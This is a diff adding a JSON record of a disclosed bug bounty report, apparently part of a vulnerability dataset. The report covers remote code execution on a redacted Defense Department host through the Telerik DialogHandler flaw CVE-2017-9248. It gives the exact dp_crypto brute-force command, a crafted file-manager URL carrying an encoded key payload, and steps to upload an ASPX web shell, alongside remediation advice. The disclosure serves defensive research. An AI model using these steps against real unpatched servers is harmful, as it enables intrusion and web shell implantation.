@@ -1,0 +1,46 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "warsong ",
+  "title": "RCE on https://\u2588\u2588\u2588\u2588\u2588/ Using CVE-2017-9248",
+  "content": "\nSummary:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ is hosting an unpatched version of the Telerik DialogHandler Telerik.Web.UI.DialogHandler.aspx allowing for the machine key to be brute forced. The machine key can be used to access the DNN file manager to upload arbitrary files including ASPX giving a web shell and RCE.\nDescription:\nTelerik has a known cryptographic weakness in older versions of the Dialog Handler which when exploited can be used to brute force the machine key and gain access to the DNN file manager. The file manager allows for ASPX shell upload and RCE.\nStep-by-step Reproduction Instructions\nHit https://\u2588\u2588\u2588/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx and notice the handler dialog message.\nDownload https://github.com/bao7uo/dp_crypto to make brute force simple and run:\npython dp_crypto.py -k https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx 88 all 21\nWait for the script to finish and the key will be integrated into a link to the file manager for DNN.\nYou can use this link to upload arbitrary files to DNN. I uploaded a PNG for proof but ASPX works just as well here. I had to do a little trial and error on this one, it uses the ASCII character set and figuring out a key length of 88 took a little doing but going longer than the real key causes the base64 to start validating again from the beginning so in a test of 128 key length I was able to see the key repeat at the 89th position.\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp=HBJ/KxQ5LRscHB8ELSgfLDIsMUYUZxs2HAchCS1mEEYfLTllLCoDGwJaCCszEhxzF2YULSsCIUsCLDY+Nj0MQQAoIiMtEyFyGBMbTixmJQIAPgBPAwYIVRcoMi8fA2QeFxMDWhUSAzkIMwdcGAMYcCwtMQAvExNZNhc5dxYTLQ0XOS09HRMYOilnA3IaKB9EFC0yPgY9YFkXOCIFFhMUPRcGIgMCdBwDGyIpCzNje1YbAgxzLBwYBBsMGwAVFiYNHS05RBRKJhQbPV9DAWULWQsMC1ouAhcfKSIIKzI4fzkBdgQ8KxIcQgMpHBMfBypFFFofex8QGAEvOBMTLHcDci8tIRQLFm9RFAMEMSwDYA0BAQtZLQ0fFh0vBEMbeAB0FD4TNBcMLWMxEzlGFhMHMCw9IisEZyZ1F2MuAhYSMUsUORM/Hi4QRQMvPTUCABgKL2cbEix3OQIUIjkIM2MIbBcdGCwBEQ8fLwwfXQMBEAkeWxNAL3ccBi0HXkktZhNMA2Z4RSsDAwIpLBg+M2YQMxd3ADwZDSVGFD9RLzA9DEEfBhwxLHY5NAAWIk0YXTlYKUspEDUWVUcCAxg6KQMABAAHKVAtEhxPBC0PRh1kPg8tWykILwNwYDBnF1ouBy0wFD0iPQsGPTkBdQwtLQ0HXQFaMnM2LQ9LLwYcMR0DAC8vEmwULQEXXCk9DAsDPHtOLXcfMAAXIkAZAxdEFXYHEgtZHEMfXQw2LVgyCQMXPVQELhMAGSgPOR0+LhILAjIvLl06NwMuG0EXPRwxCFoLXhcGNjcuHD43L2dhDxx3OVwvPVIWBxlRShQQfysvAwAEHykXQix3BAkcKDFnHwEQPxkGDzEtEwMAHAIpURl0OUYbBgw1NQMAGxheFC4dPyUEGi0QFDEsNWooIwAjAgFZdRQ4YCkrZxxNKDIbNTBgdw8ZEQQUKRIlLwMQE2QZdQtLBj0tWy93BDcbBCUgGGctBwU6LQMVdQ8/GwQUJgYQOjQUaD10GAM5aR0yMhAEPS1IHj4AIy0DIjIZOxcTA1oEARktGzo0FAwIAA0iDiw4E0QZHD0CFXQUAAcFB1sedhBwGQY2AioCNWwEPgNaLREPDRkvFAQEAhgbHl4YLRl1fHwZBgw0BD0QSyksIisuLi5zGQIlPSxmOWwbLiUoAxRoRBopLggsEWUOGBAQBh4SKQkzWC1+KWcydS8yJQkUAgtZMBMXWisDOQEvAyIACAIyORdjIT8DABNZLCIqKw==\nhttps://\u2588\u2588\u2588\u2588/GSP.png\nProduct, Version, and Configuration (If applicable)\nTelerik <= 2017.1.118\nSuggested Mitigation/Remediation Actions\nPatch Telerik or switch to a different editor like CKEditor.\nImpact\nCritical: Exploitation allows for a web shell, defacement, etc through arbitrary unrestricted file uploads.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cryptographic Issues - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1570749120,
+  "report_url": "https://hackerone.com/reports/491668",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Access the Telerik DialogHandler at https://\u2588\u2588\u2588\u2588\u2588/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx to confirm its presence."
+    ],
+    [
+      2,
+      "Use the dp_crypto.py script to brute force the machine key: python dp_crypto.py -k https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx 88 all 21"
+    ],
+    [
+      3,
+      "Use the obtained machine key to access the DNN file manager via the generated link."
+    ],
+    [
+      4,
+      "Upload an ASPX web shell or arbitrary file to achieve RCE."
+    ]
+  ],
+  "vuln_description": "The vulnerability involves exploiting a cryptographic weakness in an older version of Telerik's DialogHandler to brute force the machine key. This key grants access to the DNN file manager, allowing arbitrary file uploads, including ASPX files, leading to Remote Code Execution (RCE).",
+  "reason": "The attack requires knowledge of a specific cryptographic weakness in Telerik, the use of a specialized tool to brute force the machine key, and understanding how to leverage the key to access and manipulate the DNN file manager. The steps involve multiple components and some trial and error, particularly in determining the correct key length.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
